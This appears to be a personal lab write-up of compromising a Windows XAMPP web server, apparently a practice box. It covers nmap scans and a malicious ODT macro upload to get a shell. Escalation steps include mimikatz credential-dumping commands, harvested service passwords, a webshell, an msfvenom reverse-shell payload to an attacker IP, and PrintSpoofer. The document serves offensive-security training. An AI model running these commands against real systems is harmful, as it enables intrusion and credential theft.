### Enumeration
```
IP=192.168.214.169
sudo nmap -sU -Pn $IP
sudo nmap -p- -vv -Pn $IP
sudo nmap -p80 -A $IP
```
### Ports 
- 80
	- Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
### Foothold
- 80
	- Default landing page
		- ![[Pasted image 20240709155721.png]]
		- ![[Pasted image 20240709155736.png]]
	- Fileupload
		- Tried to upload webshell.php
			- ![[Pasted image 20240709155805.png]]
		- Made fake test.odt
			- ![[Pasted image 20240709160929.png]]
			- ![[Pasted image 20240709160944.png]]
		- Tried
			- https://github.com/rodolfomarianocy/Evil-Macro
				- Create evil macro odt
				- No shell :(
				- https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004--------------------------------
					- Followed this
					- We have a shell
					- ![[Pasted image 20240709165332.png]]
					- ![[Pasted image 20240709165356.png]]
					- ![[Pasted image 20240709165404.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- `/assets/  /cgi-bin/printenv.pl  /js  /uploads/`
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
### PE
#### Windows
- `craft\thecybergeek
	- whoami /all
		- SeChangeNotifyPrivilege enabled
		- SeCreateGlobalPrivilege enabled
	- net user USERNAME
		- Check group memberships
		- nothing
	- systeminfo
		- Microsoft Windows Server 2019 Standard  10.0.17763 N/A Build 17763
		- x64
	- history
		- (Get-PSReadLineOption).HistorySavePath
			- type PATH
			- nothing
	- Users with console
		- apache
		- guest
		- administrator
		- thecybergeek
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
		- PS1
			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
				- nothing interesting
		- icacls Filepath before .exe
			- Looking for W or F
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
	- /xampp
		- /passwords.txt
			- mysql
				- root:NOTHING
			- mercury
				- newuser:wampp
			- webdav
				- xampp-dav-unsecure:ppmax2011
	- We have write access over `C:\xampp\htdocs
		- We upload webshell.php to directory. Then access it over port 80 to gain access as apache user
		- Use base64 ps1 to get rev shell
- `craft\apache`
	- whoami /all
		- SeImpersonatePrivilege enabled
			- ./PrintSpoofer64.exe -i -c cmd
				- Runs but closes
				- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.195 LPORT=22 -f exe > rev.exe
				- Move to B
				- `./PrintSpoofer64.exe -c "C:\temp\rev.exe"
				- Now we have a root shell
		- SeCreateGlobalPrivilege enable
		- SeChangeNotifyPrivilege enabled
### Credentials
### Lessons Learned
- Learned how to use odt file. Definitely need to practice more
- Look at folder permissions and see what you can do. Can sometimes upload to directories that allow you to access another user. 